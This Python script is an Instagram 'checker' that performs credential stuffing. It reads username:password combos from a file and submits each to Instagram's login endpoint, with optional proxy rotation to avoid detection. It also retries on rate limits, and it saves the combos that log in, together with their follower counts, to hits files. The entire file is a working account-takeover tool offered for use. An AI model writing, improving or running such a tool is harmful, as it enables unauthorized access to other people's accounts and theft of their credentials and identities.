import os
import requests
import json
import time
import random
from colorama import init,Fore
from datetime import datetime
from threading import Thread,Lock

init()

def clear():
    if os.name == 'posix':
        os.system('clear')
    elif os.name in ('ce', 'nt', 'dos'):
        os.system('cls')
    else:
        print("\n") * 120

def SetTitle(title_name:str):
    os.system("title {0}".format(title_name))

def ReadFile(filename,method):
    with open(filename,method) as f:
        content = [line.strip('\n') for line in f]
        return content

SetTitle('One Man Builds Instagram Checker Tool')
clear()
retry_time = int(input('[QUESTION] Enter the ratelimit retry time: '))
waiting_time = int(input('[QUESTION] Enter the waiting time between requests: '))

def GetRandomProxy():
    proxies_file = ReadFile('proxies.txt','r')
    proxies = {"http://":random.choice(proxies_file), "https://": random.choice(proxies_file)}
    return proxies

def GetInstaFollowersNum(username):
    response = requests.get('https://www.instagram.com/{0}/?__a=1'.format(username)).text
    json_data = json.loads(response)
    return json_data['graphql']['user']['edge_followed_by']['count']

def login_instagram(username, password,use_proxy:int):
    link = 'https://www.instagram.com/accounts/login/'
    login_url = 'https://www.instagram.com/accounts/login/ajax/'

    curtime = int(datetime.now().timestamp())

    get_headers = {
        "cookie": "ig_cb=1" #if this cookie header is missing you will receive cookie errors
    }

    response = requests.get(link,headers=get_headers)

    csrf = response.cookies['csrftoken']

    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{curtime}:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }

    login_header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
        "x-csrftoken": csrf
    }

    login_response = ''

    if waiting_time > 0:
        PrintText('INFO','Waiting {0}s before the request.'.format(waiting_time),Fore.YELLOW,Fore.WHITE)
        time.sleep(waiting_time)

    if use_proxy == 1:
        login_response = requests.post(login_url, data=payload, headers=login_header,proxies=GetRandomProxy())
    else:
        login_response = requests.post(login_url, data=payload, headers=login_header)

    json_data = json.loads(login_response.text)

    if 'authenticated' in json_data:
        if json_data['authenticated'] == True:
            followers = GetInstaFollowersNum(username)
            PrintText('HIT','{0}:{1} FOLLOWERS: {2}'.format(username,password,followers),Fore.GREEN,Fore.WHITE)
            with open('hits.txt','a') as f:
                f.write('{0}:{1}\n'.format(username,password))
            with open('detailed_hits.txt','a') as f:
                f.write('{0}:{1} FOLLOWERS: {2}'.format(username,password,followers))
        elif json_data['status'] == 'fail':
            if retry_time > 0:
                PrintText('ERROR','{0}:{1} -> {2} Waiting: {3}s'.format(username,password,json_data['message'],retry_time),Fore.RED,Fore.WHITE)
                time.sleep(retry_time)
        else:
            PrintText('BAD','{0}:{1} -> failed to login'.format(username,password),Fore.RED,Fore.WHITE)
            with open('bads.txt','a') as f:
                f.write('{0}:{1}\n'.format(username,password))
    elif json_data['status'] == 'fail':
        if retry_time > 0:
            PrintText('ERROR','{0}:{1} -> {2} Waiting: {3}s'.format(username,password,json_data['message'],retry_time),Fore.RED,Fore.WHITE)
            time.sleep(retry_time)
    else:
        PrintText('ERROR','{0}:{1} -> {2}'.format(username,password,json_data['message']),Fore.RED,Fore.WHITE)

def PrintText(info_name,text,info_color:Fore,text_color:Fore):
    print(f'[{info_color+info_name+Fore.RESET}] '+text_color+f'{text}')

if __name__ == "__main__":
    use_proxy = int(input('[QUESTION] Would you like to use proxies [1] yes [0] no: '))
    combos = ReadFile('combos.txt','r')

    lock = Lock()
    for combo in combos:
        lock.acquire()
        Thread(target=login_instagram(combo.split(':')[0],combo.split(':')[-1],use_proxy))
        lock.release()